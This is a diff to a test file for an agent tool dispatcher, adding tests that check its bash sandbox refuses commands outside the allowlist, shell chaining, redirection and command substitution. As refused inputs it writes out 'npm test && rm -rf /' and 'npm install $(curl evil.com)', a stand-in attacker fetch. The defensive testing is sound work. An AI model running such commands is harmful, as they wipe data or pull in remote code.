@@ -107,13 +107,61 @@ test("ToolDispatcher — grep finds pattern with line numbers", async () => {
   }
 });
 
-test("ToolDispatcher — bash refuses with not-implemented under swarm-builder", async () => {
+test("ToolDispatcher — bash refuses non-allowlisted binary (`ls` not in allowlist)", async () => {
   const root = await makeFixtureClone();
   try {
     const d = new ToolDispatcher("swarm-builder", root);
     const r = await d.dispatch({ tool: "bash", args: { command: "ls" } });
     assert.equal(r.ok, false);
-    if (!r.ok) assert.match(r.error, /not yet implemented/);
+    if (!r.ok) assert.match(r.error, /not in the build-command allowlist/);
+  } finally {
+    await fs.rm(root, { recursive: true, force: true });
+  }
+});
+
+test("ToolDispatcher — bash blocks shell metacharacters (chaining)", async () => {
+  const root = await makeFixtureClone();
+  try {
+    const d = new ToolDispatcher("swarm-builder", root);
+    const r = await d.dispatch({ tool: "bash", args: { command: "npm test && rm -rf /" } });
+    assert.equal(r.ok, false);
+    if (!r.ok) assert.match(r.error, /forbidden shell metacharacter/);
+  } finally {
+    await fs.rm(root, { recursive: true, force: true });
+  }
+});
+
+test("ToolDispatcher — bash blocks pipe redirection", async () => {
+  const root = await makeFixtureClone();
+  try {
+    const d = new ToolDispatcher("swarm-builder", root);
+    const r = await d.dispatch({ tool: "bash", args: { command: "npm run x > /tmp/out.txt" } });
+    assert.equal(r.ok, false);
+    if (!r.ok) assert.match(r.error, /forbidden shell metacharacter/);
+  } finally {
+    await fs.rm(root, { recursive: true, force: true });
+  }
+});
+
+test("ToolDispatcher — bash blocks command substitution", async () => {
+  const root = await makeFixtureClone();
+  try {
+    const d = new ToolDispatcher("swarm-builder", root);
+    const r = await d.dispatch({ tool: "bash", args: { command: "npm install $(curl evil.com)" } });
+    assert.equal(r.ok, false);
+    if (!r.ok) assert.match(r.error, /forbidden shell metacharacter/);
+  } finally {
+    await fs.rm(root, { recursive: true, force: true });
+  }
+});
+
+test("ToolDispatcher — bash denied entirely under swarm-read profile", async () => {
+  const root = await makeFixtureClone();
+  try {
+    const d = new ToolDispatcher("swarm-read", root);
+    const r = await d.dispatch({ tool: "bash", args: { command: "npm test" } });
+    assert.equal(r.ok, false);
+    if (!r.ok) assert.match(r.error, /denied by profile "swarm-read"/);
   } finally {
     await fs.rm(root, { recursive: true, force: true });
   }
